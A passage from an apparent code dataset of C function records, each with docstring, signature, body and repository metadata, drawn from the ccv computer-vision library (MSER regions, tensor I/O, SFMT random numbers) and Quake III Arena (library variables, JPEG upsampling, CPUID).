skip\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\tccv_mser_node_t* node1 = _ccv_mser_find_root(nnode);\n\t\t\t\t\tif (node0 != node1)\n\t\t\t\t\t{\n\t\t\t\t\t\t// grep the extended root information\n\t\t\t\t\t\tccv_mser_history_t* root0 = (node0->root >= 0) ? (ccv_mser_history_t*)ccv_array_get(history_list, node0->root) : 0;\n\t\t\t\t\t\tccv_mser_history_t* root1 = (node1->root >= 0) ? (ccv_mser_history_t*)ccv_array_get(history_list, node1->root) : 0;\n\t\t\t\t\t\t// swap the node if root1 has higher rank, or larger in size, or root0 is non-existent\n\t\t\t\t\t\tif ((root0 && root1 && (root1->value > root0->value\n\t\t\t\t\t\t\t\t\t\t\t\t|| (root1->value == root0->value && root1->rank > root0->rank)\n\t\t\t\t\t\t\t\t\t\t\t\t|| (root1->value == root0->value && root1->rank == root0->rank && root1->size > root0->size)))\n\t\t\t\t\t\t\t|| (root1 && !root0))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tccv_mser_node_t* node = node0;\n\t\t\t\t\t\t\tnode0 = node1;\n\t\t\t\t\t\t\tnode1 = node;\n\t\t\t\t\t\t\tccv_mser_history_t* root = root0;\n\t\t\t\t\t\t\troot0 = root1;\n\t\t\t\t\t\t\troot1 = root;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (!root0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tccv_mser_history_t root = {\n\t\t\t\t\t\t\t\t.rank = 0,\n\t\t\t\t\t\t\t\t.size = 1,\n\t\t\t\t\t\t\t\t.value = v,\n\t\t\t\t\t\t\t\t.shortcut = history_list->rnum,\n\t\t\t\t\t\t\t\t.parent = history_list->rnum,\n\t\t\t\t\t\t\t\t.head = node0,\n\t\t\t\t\t\t\t\t.tail = node1\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\tnode0->root = history_list->rnum;\n\t\t\t\t\t\t\tccv_array_push(history_list, &root);\n\t\t\t\t\t\t\troot0 = (ccv_mser_history_t*)ccv_array_get(history_list, history_list->rnum - 1);\n\t\t\t\t\t\t\tassert(node1->root == -1);\n\t\t\t\t\t\t} else if (root0->value < v) {\n\t\t\t\t\t\t\t// conceal the old root as history (er), making a new one and pointing to it\n\t\t\t\t\t\t\troot0->shortcut = root0->parent = history_list->rnum;\n\t\t\t\t\t\t\tccv_mser_history_t root = *root0;\n\t\t\t\t\t\t\troot.value = v;\n\t\t\t\t\t\t\tnode0->root = history_list->rnum;\n\t\t\t\t\t\t\tccv_array_push(history_list, &root);\n\t\t\t\t\t\t\troot0 = (ccv_mser_history_t*)ccv_array_get(history_list, history_list->rnum - 1);\n\t\t\t\t\t\t\troot1 = (node1->root >= 0) ? (ccv_mser_history_t*)ccv_array_get(history_list, node1->root) : 0; // the memory may be reallocated\n\t\t\t\t\t\t\troot0->rank = ccv_max(root0->rank, (root1 ? root1->rank : 0)) + 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (root1)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif (root1->value < root0->value) // in this case, root1 is sealed as well\n\t\t\t\t\t\t\t\troot1->parent = node0->root;\n\t\t\t\t\t\t\t// thus, if root1->parent == itself && root1->shortcut != itself\n\t\t\t\t\t\t\t// it is voided, and not sealed\n\t\t\t\t\t\t\troot1->shortcut = node0->root;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t// merge the two\n\t\t\t\t\t\tnode1->shortcut = node0;\n\t\t\t\t\t\troot0->size += root1 ? root1->size : 1;\n\t\t\t\t\t\t/* insert one endless double link list to another, see illustration:\n\t\t\t\t\t\t * 0->1->2->3->4->5->0\n\t\t\t\t\t\t * a->b->c->d->a\n\t\t\t\t\t\t * set 5.next (0.prev.next) point to a\n\t\t\t\t\t\t * set 0.prev point to d\n\t\t\t\t\t\t * set d.next (a.prev.next) point to 0\n\t\t\t\t\t\t * set a.prev point to 5\n\t\t\t\t\t\t * the result endless double link list will be:\n\t\t\t\t\t\t * 0->1->2->3->4->5->a->b->c->d->0 */\n\t\t\t\t\t\tnode0->prev->next = node1;\n\t\t\t\t\t\tccv_mser_node_t* prev = node0->prev;\n\t\t\t\t\t\tnode0->prev = node1->prev;\n\t\t\t\t\t\tnode1->prev->next = node0; // consider self-referencing\n\t\t\t\t\t\tnode1->prev = prev;\n\t\t\t\t\t\troot0->head = node0;\n\t\t\t\t\t\troot0->tail = node0->prev;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t// void non-extremal regions, the region that hasn't sealed, but was merged\n\tfor (i = 0; i < history_list->rnum; i++)\n\t{\n\t\tccv_mser_history_t* er = (ccv_mser_history_t*)ccv_array_get(history_list, i);\n\t\ter->stable = !(er->parent == i && er->shortcut != i);\n\t}\n\t// compute variations\n\tfor (i = 0; i < history_list->rnum; i++)\n\t{\n\t\tccv_mser_history_t* er = (ccv_mser_history_t*)ccv_array_get(history_list, i);\n\t\tif (!er->stable)\n\t\t\tcontinue;\n\t\tint top_val = er->value + params.delta;\n\t\tint top = er->shortcut;\n\t\tfor (;;)\n\t\t{\n\t\t\tccv_mser_history_t* ter = (ccv_mser_history_t*)ccv_array_get(history_list, top);\n\t\t\tint next = ter->parent;\n\t\t\tccv_mser_history_t* ner = (ccv_mser_history_t*)ccv_array_get(history_list, next);\n\t\t\tif (next == top || ner->value > top_val)\n\t\t\t\tbreak;\n\t\t\ttop = next;\n\t\t}\n\t\tccv_mser_history_t* ter = (ccv_mser_history_t*)ccv_array_get(history_list, top);\n\t\ter->variance = (float)(ter->size - er->size) / er->size;\n\t\tccv_mser_history_t* ner = (ccv_mser_history_t*)ccv_array_get(history_list, er->parent);\n\t\tner->shortcut = ccv_max(top, ner->shortcut);\n\t}\n\t// delete unstable one\n\tfor (i = 0; i < history_list->rnum; i++)\n\t{\n\t\tccv_mser_history_t* er = (ccv_mser_history_t*)ccv_array_get(history_list, i);\n\t\tif (!er->stable || i == er->parent)\n\t\t\tcontinue;\n\t\tccv_mser_history_t* per = (ccv_mser_history_t*)ccv_array_get(history_list, er->parent);\n\t\tif (per->value > er->value + 1)\n\t\t\tcontinue;\n\t\tif (per->variance > er->variance)\n\t\t\tper->stable = 0;\n\t\telse\n\t\t\ter->stable = 0;\n\t}\n\t// filter out more regions with params\n\tfor (i = history_list->rnum - 1; i >= 0; i--)\n\t{\n\t\tccv_mser_history_t* er = (ccv_mser_history_t*)ccv_array_get(history_list, i);\n\t\tif (!er->stable ||\n\t\t\ter->variance > params.max_variance ||\n\t\t\ter->size > params.max_area ||\n\t\t\ter->size < params.min_area)\n\t\t{\n\t\t\ter->stable = 0;\n\t\t\tcontinue;\n\t\t}\n\t\tccv_mser_history_t* per = (ccv_mser_history_t*)ccv_array_get(history_list, er->parent);\n\t\tif (per != er)\n\t\t{\n\t\t\twhile (!per->stable)\n\t\t\t{\n\t\t\t\tccv_mser_history_t* ner = (ccv_mser_history_t*)ccv_array_get(history_list, per->parent);\n\t\t\t\tif (ner == per)\n\t\t\t\t\tbreak;\n\t\t\t\tper = ner;\n\t\t\t}\n\t\t\tif (per->stable)\n\t\t\t{\n\t\t\t\tfloat div = (float)(per->size - er->size) / per->size;\n\t\t\t\tif (div < params.min_diversity)\n\t\t\t\t\ter->stable = 0;\n\t\t\t}\n\t\t}\n\t}\n\tassert(seq->rsize == sizeof(ccv_mser_keypoint_t));\n\tccv_zero(b);\n\tunsigned char* b_ptr = b->data.u8;\n\tint seq_no = 1;\n#define for_block(_, _for_set, _for_get) \\\n\tfor (i = 0; i < history_list->rnum; i++) \\\n\t{ \\\n\t\tccv_mser_history_t* er = (ccv_mser_history_t*)ccv_array_get(history_list, i); \\\n\t\tif (er->stable) \\\n\t\t{ \\\n\t\t\tccv_mser_node_t* node = er->head; \\\n\t\t\tccv_mser_keypoint_t mser_keypoint = { \\\n\t\t\t\t.size = er->size, \\\n\t\t\t\t.keypoint = node->point, \\\n\t\t\t\t.m10 = 0, .m01 = 0, .m11 = 0, \\\n\t\t\t\t.m20 = 0, .m02 = 0, \\\n\t\t\t}; \\\n\t\t\tccv_point_t min_point = node->point, \\\n\t\t\t\t\t\tmax_point = node->point; \\\n\t\t\tfor (j = 0; j < er->size; j++) \\\n\t\t\t{ \\\n\t\t\t\tif (_for_get(b_ptr + node->point.y * b->step, node->point.x) == 0) \\\n\t\t\t\t\t_for_set(b_ptr + node->point.y * b->step, node->point.x, seq_no); \\\n\t\t\t\tmin_point.x = ccv_min(min_point.x, node->point.x); \\\n\t\t\t\tmin_point.y = ccv_min(min_point.y, node->point.y); \\\n\t\t\t\tmax_point.x = ccv_max(max_point.x, node->point.x); \\\n\t\t\t\tmax_point.y = ccv_max(max_point.y, node->point.y); \\\n\t\t\t\tnode = node->next; \\\n\t\t\t} \\\n\t\t\tassert(node->prev == er->tail); /* endless double link list */ \\\n\t\t\tmser_keypoint.rect = ccv_rect(min_point.x, min_point.y, max_point.x - min_point.x + 1, max_point.y - min_point.y + 1); \\\n\t\t\tccv_array_push(seq, &mser_keypoint); \\\n\t\t\t++seq_no; \\\n\t\t} \\\n\t}\n\tccv_matrix_setter_getter(b->type, for_block);\n#undef for_block\n\tccv_array_free(history_list);\n\tccfree(rnode);\n\tccfree(node);\n}", "path": "ccv/lib/ccv_mser.c", "commit_date": "2020-07-07 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// MARK - Level-3.5 API\n", "func_signal": "void ccv_nnc_tensor_multiview(ccv_nnc_tensor_t* data[], const uint8_t kind, const uint16_t repeat, const ccv_nnc_graph_t* const graph, ccv_nnc_tensor_multiview_t* const tensor_multiview)", "code": "{\n\tassert(kind == CCV_NNC_MULTIVIEW_K0N || kind == CCV_NNC_MULTIVIEW_K1N);\n\tassert(repeat > 0);\n\ttensor_multiview->type = CCV_TENSOR_MULTIVIEW;\n\ttensor_multiview->kind = kind;\n\ttensor_multiview->repeat = repeat;\n\ttensor_multiview->anchor = (intptr_t)graph;\n\ttensor_multiview->it = 0;\n\ttensor_multiview->p = 0;\n\ttensor_multiview->offset = 0;\n\ttensor_multiview->sp = 0;\n\ttensor_multiview->_heap_data = (repeat + kind <= sizeof(tensor_multiview->_inline_data) / sizeof(tensor_multiview->_inline_data[0])) ? 0 : ccmalloc(sizeof(ccv_nnc_tensor_t*) * (repeat + kind));\n\tint i;\n\t// Currently, only CCV_NNC_MULTIVIEW_K12 uses 3 tensors.\n\tfor (i = 0; i < repeat + kind; i++)\n\t{\n\t\tCCV_NNC_MULTIVIEW_DATA(tensor_multiview)[i] = data[i];\n\t\tccv_nnc_tensor_multiview_t* const mv = (ccv_nnc_tensor_multiview_t*)data[i];\n\t\tif (data[i] != CCV_NNC_TENSOR_PLACEHOLDER && CCV_IS_TENSOR_MULTIVIEW(mv))\n\t\t\tmv->p = tensor_multiview;\n\t}\n}", "path": "ccv/lib/nnc/ccv_nnc_graph_while.c", "commit_date": "2020-09-19 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function fills the user-specified array with pseudorandom\n * integers.\n *\n * @param sfmt SFMT internal state\n * @param array an 128-bit array to be filled by pseudorandom numbers.\n * @param size number of 128-bit pseudorandom numbers to be generated.\n */\n", "func_signal": "inline static void gen_rand_array(sfmt_t * sfmt, w128_t *array, int size)", "code": "{\n    int i, j;\n    w128_t *r1, *r2;\n\n    r1 = &sfmt->state[SFMT_N - 2];\n    r2 = &sfmt->state[SFMT_N - 1];\n    for (i = 0; i < SFMT_N - SFMT_POS1; i++) {\n\tdo_recursion(&array[i], &sfmt->state[i], &sfmt->state[i + SFMT_POS1], r1, r2);\n\tr1 = r2;\n\tr2 = &array[i];\n    }\n    for (; i < SFMT_N; i++) {\n\tdo_recursion(&array[i], &sfmt->state[i],\n\t\t     &array[i + SFMT_POS1 - SFMT_N], r1, r2);\n\tr1 = r2;\n\tr2 = &array[i];\n    }\n    for (; i < size - SFMT_N; i++) {\n\tdo_recursion(&array[i], &array[i - SFMT_N],\n\t\t     &array[i + SFMT_POS1 - SFMT_N], r1, r2);\n\tr1 = r2;\n\tr2 = &array[i];\n    }\n    for (j = 0; j < 2 * SFMT_N - size; j++) {\n\tsfmt->state[j] = array[j + size - SFMT_N];\n    }\n    for (; i < size; i++, j++) {\n\tdo_recursion(&array[i], &array[i - SFMT_N],\n\t\t     &array[i + SFMT_POS1 - SFMT_N], r1, r2);\n\tr1 = r2;\n\tr2 = &array[i];\n\tsfmt->state[j] = array[i];\n    }\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function returns the minimum size of array used for \\b\n * fill_array64() function.\n * @param sfmt SFMT internal state\n * @return minimum size of array used for fill_array64() function.\n */\n", "func_signal": "int sfmt_get_min_array_size64(sfmt_t * sfmt)", "code": "{\n    UNUSED_VARIABLE(sfmt);\n    return SFMT_N64;\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// MARK - Level-1 API\n", "func_signal": "int ccv_nnc_tensor_write(const ccv_nnc_tensor_t* const tensor, void* const handle, const char* const name)", "code": "{\n\tassert(!CCV_IS_TENSOR_VIEW(tensor));\n\tassert(name);\n\tsqlite3* conn = (sqlite3*)handle;\n\tif (!conn)\n\t\treturn CCV_IO_ERROR;\n\tconst char tensor_create_table_qs[] = \"CREATE TABLE IF NOT EXISTS tensors \"\n\t\t\"(name TEXT, type INTEGER, format INTEGER, datatype INTEGER, \"\n\t\t\"dim BLOB, data BLOB, PRIMARY KEY (name))\";\n\tSQLITE_ENFORCE(SQLITE_OK == sqlite3_exec(conn, tensor_create_table_qs, 0, 0, 0));\n\tconst char tensor_insert_qs[] =\n\t\t\"REPLACE INTO tensors \"\n\t\t\"(name, type, format, datatype, dim, data) VALUES (\"\n\t\t\"$name, $type, $format, $datatype, $dim, $data)\";\n\tsqlite3_stmt* tensor_insert_stmt = 0;\n\tSQLITE_ENFORCE(SQLITE_OK == sqlite3_prepare_v2(conn, tensor_insert_qs, sizeof(tensor_insert_qs), &tensor_insert_stmt, 0));\n\tsqlite3_bind_text(tensor_insert_stmt, 1, name, -1, 0);\n\tsqlite3_bind_int(tensor_insert_stmt, 2, tensor->info.type);\n\tsqlite3_bind_int(tensor_insert_stmt, 3, tensor->info.format);\n\tsqlite3_bind_int(tensor_insert_stmt, 4, tensor->info.datatype);\n\tsqlite3_bind_blob(tensor_insert_stmt, 5, tensor->info.dim, sizeof(tensor->info.dim), 0);\n\tconst size_t data_size = ccv_nnc_tensor_data_size(tensor->info);\n\tvoid* workspace = 0;\n#ifdef HAVE_CUDA\n\tif (CCV_TENSOR_GET_MEMORY(tensor->info.type) == CCV_TENSOR_GPU_MEMORY)\n\t{\n\t\tworkspace = ccmalloc(data_size);\n\t\tcumemcpy(workspace, CCV_TENSOR_CPU_MEMORY, tensor->data.u8, tensor->info.type, data_size);\n\t\tsqlite3_bind_blob(tensor_insert_stmt, 6, workspace, data_size, 0);\n\t} else\n\t\tsqlite3_bind_blob(tensor_insert_stmt, 6, tensor->data.u8, data_size, 0);\n#else\n\tsqlite3_bind_blob(tensor_insert_stmt, 6, tensor->data.u8, data_size, 0);\n#endif\n\tsqlite3_step(tensor_insert_stmt);\n\tsqlite3_reset(tensor_insert_stmt);\n\tsqlite3_clear_bindings(tensor_insert_stmt);\n\tsqlite3_finalize(tensor_insert_stmt);\n\tif (workspace)\n\t\tfree(workspace);\n\treturn CCV_IO_FINAL;\n}", "path": "ccv/lib/nnc/ccv_nnc_tensor_io.c", "commit_date": "2020-09-19 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "//end of the function LibVarValue\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void LibVarSet(char *var_name, char *value)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVarGet(var_name);\n\tif (v)\n\t{\n\t\tFreeMemory(v->string);\n\t} //end if\n\telse\n\t{\n\t\tv = LibVarAlloc(var_name);\n\t} //end else\n\t//variable string\n\tv->string = (char *) GetMemory(strlen(value) + 1);\n\tstrcpy(v->string, value);\n\t//the value\n\tv->value = LibVarStringValue(v->string);\n\t//variable is modified\n\tv->modified = qtrue;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n * Upsample and color convert for the case of 2:1 horizontal and 2:1 vertical.\n */\n", "func_signal": "METHODDEF void\nh2v2_merged_upsample (j_decompress_ptr cinfo,\n\t\t      JSAMPIMAGE input_buf, JDIMENSION in_row_group_ctr,\n\t\t      JSAMPARRAY output_buf)", "code": "{\n  my_upsample_ptr upsample = (my_upsample_ptr) cinfo->upsample;\n  register int y, cred, cgreen, cblue;\n  int cb, cr;\n  register JSAMPROW outptr0, outptr1;\n  JSAMPROW inptr00, inptr01, inptr1, inptr2;\n  JDIMENSION col;\n  /* copy these pointers into registers if possible */\n  register JSAMPLE * range_limit = cinfo->sample_range_limit;\n  int * Crrtab = upsample->Cr_r_tab;\n  int * Cbbtab = upsample->Cb_b_tab;\n  INT32 * Crgtab = upsample->Cr_g_tab;\n  INT32 * Cbgtab = upsample->Cb_g_tab;\n  SHIFT_TEMPS\n\n  inptr00 = input_buf[0][in_row_group_ctr*2];\n  inptr01 = input_buf[0][in_row_group_ctr*2 + 1];\n  inptr1 = input_buf[1][in_row_group_ctr];\n  inptr2 = input_buf[2][in_row_group_ctr];\n  outptr0 = output_buf[0];\n  outptr1 = output_buf[1];\n  /* Loop for each group of output pixels */\n  for (col = cinfo->output_width >> 1; col > 0; col--) {\n    /* Do the chroma part of the calculation */\n    cb = GETJSAMPLE(*inptr1++);\n    cr = GETJSAMPLE(*inptr2++);\n    cred = Crrtab[cr];\n    cgreen = (int) RIGHT_SHIFT(Cbgtab[cb] + Crgtab[cr], SCALEBITS);\n    cblue = Cbbtab[cb];\n    /* Fetch 4 Y values and emit 4 pixels */\n    y  = GETJSAMPLE(*inptr00++);\n    outptr0[RGB_RED] =   range_limit[y + cred];\n    outptr0[RGB_GREEN] = range_limit[y + cgreen];\n    outptr0[RGB_BLUE] =  range_limit[y + cblue];\n    outptr0 += RGB_PIXELSIZE;\n    y  = GETJSAMPLE(*inptr00++);\n    outptr0[RGB_RED] =   range_limit[y + cred];\n    outptr0[RGB_GREEN] = range_limit[y + cgreen];\n    outptr0[RGB_BLUE] =  range_limit[y + cblue];\n    outptr0 += RGB_PIXELSIZE;\n    y  = GETJSAMPLE(*inptr01++);\n    outptr1[RGB_RED] =   range_limit[y + cred];\n    outptr1[RGB_GREEN] = range_limit[y + cgreen];\n    outptr1[RGB_BLUE] =  range_limit[y + cblue];\n    outptr1 += RGB_PIXELSIZE;\n    y  = GETJSAMPLE(*inptr01++);\n    outptr1[RGB_RED] =   range_limit[y + cred];\n    outptr1[RGB_GREEN] = range_limit[y + cgreen];\n    outptr1[RGB_BLUE] =  range_limit[y + cblue];\n    outptr1 += RGB_PIXELSIZE;\n  }\n  /* If image width is odd, do the last output column separately */\n  if (cinfo->output_width & 1) {\n    cb = GETJSAMPLE(*inptr1);\n    cr = GETJSAMPLE(*inptr2);\n    cred = Crrtab[cr];\n    cgreen = (int) RIGHT_SHIFT(Cbgtab[cb] + Crgtab[cr], SCALEBITS);\n    cblue = Cbbtab[cb];\n    y  = GETJSAMPLE(*inptr00);\n    outptr0[RGB_RED] =   range_limit[y + cred];\n    outptr0[RGB_GREEN] = range_limit[y + cgreen];\n    outptr0[RGB_BLUE] =  range_limit[y + cblue];\n    y  = GETJSAMPLE(*inptr01);\n    outptr1[RGB_RED] =   range_limit[y + cred];\n    outptr1[RGB_GREEN] = range_limit[y + cgreen];\n    outptr1[RGB_BLUE] =  range_limit[y + cblue];\n  }\n}", "path": "Quake-III-Arena/code/jpeg-6/jdmerge.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVar\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "char *LibVarString(char *var_name, char *value)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVar(var_name, value);\n\treturn v->string;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarDeAllocAll\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "libvar_t *LibVarGet(char *var_name)", "code": "{\n\tlibvar_t *v;\n\n\tfor (v = libvarlist; v; v = v->next)\n\t{\n\t\tif (!Q_stricmp(v->name, var_name))\n\t\t{\n\t\t\treturn v;\n\t\t} //end if\n\t} //end for\n\treturn NULL;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n** --------------------------------------------------------------------------------\n**\n** PROCESSOR STUFF\n**\n** --------------------------------------------------------------------------------\n*/\n", "func_signal": "static void CPUID( int func, unsigned regs[4] )", "code": "{\n\tunsigned regEAX, regEBX, regECX, regEDX;\n\n#ifndef __VECTORC\n\t__asm mov eax, func\n\t__asm __emit 00fh\n\t__asm __emit 0a2h\n\t__asm mov regEAX, eax\n\t__asm mov regEBX, ebx\n\t__asm mov regECX, ecx\n\t__asm mov regEDX, edx\n\n\tregs[0] = regEAX;\n\tregs[1] = regEBX;\n\tregs[2] = regECX;\n\tregs[3] = regEDX;\n#else\n\tregs[0] = 0;\n\tregs[1] = 0;\n\tregs[2] = 0;\n\tregs[3] = 0;\n#endif\n}", "path": "Quake-III-Arena/code/win32/win_shared.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n * Upsample and color convert for the case of 2:1 horizontal and 1:1 vertical.\n */\n", "func_signal": "METHODDEF void\nh2v1_merged_upsample (j_decompress_ptr cinfo,\n\t\t      JSAMPIMAGE input_buf, JDIMENSION in_row_group_ctr,\n\t\t      JSAMPARRAY output_buf)", "code": "{\n  my_upsample_ptr upsample = (my_upsample_ptr) cinfo->upsample;\n  register int y, cred, cgreen, cblue;\n  int cb, cr;\n  register JSAMPROW outptr;\n  JSAMPROW inptr0, inptr1, inptr2;\n  JDIMENSION col;\n  /* copy these pointers into registers if possible */\n  register JSAMPLE * range_limit = cinfo->sample_range_limit;\n  int * Crrtab = upsample->Cr_r_tab;\n  int * Cbbtab = upsample->Cb_b_tab;\n  INT32 * Crgtab = upsample->Cr_g_tab;\n  INT32 * Cbgtab = upsample->Cb_g_tab;\n  SHIFT_TEMPS\n\n  inptr0 = input_buf[0][in_row_group_ctr];\n  inptr1 = input_buf[1][in_row_group_ctr];\n  inptr2 = input_buf[2][in_row_group_ctr];\n  outptr = output_buf[0];\n  /* Loop for each pair of output pixels */\n  for (col = cinfo->output_width >> 1; col > 0; col--) {\n    /* Do the chroma part of the calculation */\n    cb = GETJSAMPLE(*inptr1++);\n    cr = GETJSAMPLE(*inptr2++);\n    cred = Crrtab[cr];\n    cgreen = (int) RIGHT_SHIFT(Cbgtab[cb] + Crgtab[cr], SCALEBITS);\n    cblue = Cbbtab[cb];\n    /* Fetch 2 Y values and emit 2 pixels */\n    y  = GETJSAMPLE(*inptr0++);\n    outptr[RGB_RED] =   range_limit[y + cred];\n    outptr[RGB_GREEN] = range_limit[y + cgreen];\n    outptr[RGB_BLUE] =  range_limit[y + cblue];\n    outptr += RGB_PIXELSIZE;\n    y  = GETJSAMPLE(*inptr0++);\n    outptr[RGB_RED] =   range_limit[y + cred];\n    outptr[RGB_GREEN] = range_limit[y + cgreen];\n    outptr[RGB_BLUE] =  range_limit[y + cblue];\n    outptr += RGB_PIXELSIZE;\n  }\n  /* If image width is odd, do the last output column separately */\n  if (cinfo->output_width & 1) {\n    cb = GETJSAMPLE(*inptr1);\n    cr = GETJSAMPLE(*inptr2);\n    cred = Crrtab[cr];\n    cgreen = (int) RIGHT_SHIFT(Cbgtab[cb] + Crgtab[cr], SCALEBITS);\n    cblue = Cbbtab[cb];\n    y  = GETJSAMPLE(*inptr0);\n    outptr[RGB_RED] =   range_limit[y + cred];\n    outptr[RGB_GREEN] = range_limit[y + cgreen];\n    outptr[RGB_BLUE] =  range_limit[y + cblue];\n  }\n}", "path": "Quake-III-Arena/code/jpeg-6/jdmerge.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarGet\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "char *LibVarGetString(char *var_name)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVarGet(var_name);\n\tif (v)\n\t{\n\t\treturn v->string;\n\t} //end if\n\telse\n\t{\n\t\treturn \"\";\n\t} //end else\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarDeAlloc\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void LibVarDeAllocAll(void)", "code": "{\n\tlibvar_t *v;\n\n\tfor (v = libvarlist; v; v = libvarlist)\n\t{\n\t\tlibvarlist = libvarlist->next;\n\t\tLibVarDeAlloc(v);\n\t} //end for\n\tlibvarlist = NULL;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarString\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "float LibVarValue(char *var_name, char *value)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVar(var_name, value);\n\treturn v->value;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarStringValue\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "libvar_t *LibVarAlloc(char *var_name)", "code": "{\n\tlibvar_t *v;\n\n\tv = (libvar_t *) GetMemory(sizeof(libvar_t) + strlen(var_name) + 1);\n\tCom_Memset(v, 0, sizeof(libvar_t));\n\tv->name = (char *) v + sizeof(libvar_t);\n\tstrcpy(v->name, var_name);\n\t//add the variable in the list\n\tv->next = libvarlist;\n\tlibvarlist = v;\n\treturn v;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarGetString\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "float LibVarGetValue(char *var_name)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVarGet(var_name);\n\tif (v)\n\t{\n\t\treturn v->value;\n\t} //end if\n\telse\n\t{\n\t\treturn 0;\n\t} //end else\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "float LibVarStringValue(char *string)", "code": "{\n\tint dotfound = 0;\n\tfloat value = 0;\n\n\twhile(*string)\n\t{\n\t\tif (*string < '0' || *string > '9')\n\t\t{\n\t\t\tif (dotfound || *string != '.')\n\t\t\t{\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t\telse\n\t\t\t{\n\t\t\t\tdotfound = 10;\n\t\t\t\tstring++;\n\t\t\t} //end if\n\t\t} //end if\n\t\tif (dotfound)\n\t\t{\n\t\t\tvalue = value + (float) (*string - '0') / (float) dotfound;\n\t\t\tdotfound *= 10;\n\t\t} //end if\n\t\telse\n\t\t{\n\t\t\tvalue = value * 10.0 + (float) (*string - '0');\n\t\t} //end else\n\t\tstring++;\n\t} //end while\n\treturn 